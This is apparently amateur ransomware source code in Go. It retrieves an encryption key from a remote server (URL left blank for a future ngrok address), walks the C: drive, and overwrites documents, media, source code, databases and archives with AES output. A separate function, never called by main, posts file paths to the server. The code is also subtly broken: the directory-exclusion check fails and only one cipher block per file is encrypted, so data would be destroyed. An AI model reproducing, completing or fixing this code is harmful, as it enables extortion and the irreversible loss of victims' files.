package main

import (
	// "fmt"
	"bytes"
	"log"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"crypto/aes"
	"encoding/json"
	"strings"
)

const (
	//later fill with ngrok url...
	SERVER_URL = ""
)

//declare stuff
var (
	key []byte

	EXCLUDE_DIRECTORY = [...]string{ 
							"/usr", //Mac/Linux system directory
							"/Library/",
							"/System",
							"/Applications",
							".Trash",
							//Windows system directory
							"Program Files",
							"Program Files (x86)",
							"Windows",
							"$Recycle.Bin",
							"AppData",
							"logs",

	}

	EXTENSIONS = [...]string{
	// ".exe,", ".dll", ".so", ".rpm", ".deb", ".vmlinuz", ".img",  // SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
	".jpg", ".jpeg", ".bmp", ".gif", ".png", ".svg", ".psd", ".raw", // images
	".mp3",".mp4", ".m4a", ".aac",".ogg",".flac", ".wav", ".wma", ".aiff", ".ape", // music and sound
	".avi", ".flv", ".m4v", ".mkv", ".mov", ".mpg", ".mpeg", ".wmv", ".swf", ".3gp", // Video and movies

	".doc", ".docx", ".xls", ".xlsx", ".ppt",".pptx", // Microsoft office
	".odt", ".odp", ".ods", ".txt", ".rtf", ".tex", ".pdf", ".epub", ".md", ".txt", // OpenOffice, Adobe, Latex, Markdown, etc
	".yml", ".yaml", ".json", ".xml", ".csv", // structured data
	".db", ".sql", ".dbf", ".mdb", ".iso", // databases and disc images

	".html", ".htm", ".xhtml", ".php", ".asp", ".aspx", ".js", ".jsp", ".css", // web technologies
	".c", ".cpp", ".cxx", ".h", ".hpp", ".hxx", // C source code
	".java", ".class", ".jar", // java source code
	".ps", ".bat", ".vb", ".vbs", // windows based scripts,
	".awk", ".sh", ".cgi", ".pl", ".ada", ".swift", // linux/mac based scripts
	".go", ".py", ".pyc", ".bf", ".coffee", // other source code files

	".zip", ".tar", ".tgz", ".bz2", ".7z", ".rar", ".bak",  // compressed formats
	}

	fileList = make([]string, 0)

)
func check(err error) {
	if err != nil {log.Fatal(err)}
}

func getKey(){	
	//get response to retrieve the key
	resp, err := http.Get(SERVER_URL)
	check(err)
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	// 32 digit key 
	key = body
}

func sendMetaData(){
	for _, path := range fileList {
		body, _ := json.Marshal(map[string]string{
			"" : path,
		})
		postbody := bytes.NewBuffer(body)
		postResp, err := http.Post(SERVER_URL, "application/json", postbody)
		check(err)
		defer postResp.Body.Close()
	}
}

func traverseAndEncrypt() {
	//will target windows only (idk)
	searchDir := `C:\\` 
	e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
		for _, exclude := range EXCLUDE_DIRECTORY {
			if !strings.Contains(path, exclude){
				fileList = append(fileList, path)
				break
			}
		}
		return nil
	})
	check(e)
	//begin encrypting the file
	for _, file := range fileList {
		for _, ext := range EXTENSIONS {
			if strings.Contains(file, ext) {
				encrypt(key, file) 
			} 
		}
	}

}

func encrypt(key []byte, file string){
	//will do a basic aes to directory
	//open file 
	text, err := os.ReadFile(file)
	check(err)
	aes, err := aes.NewCipher(key)
	check(err)
	cipherText := make([]byte, len(text))
	aes.Encrypt(cipherText, []byte(text))
	//write the new encrypted text 
	err = os.WriteFile(file, cipherText, 0644)
	check(err)
}

func main(){
	getKey()
	traverseAndEncrypt()
}

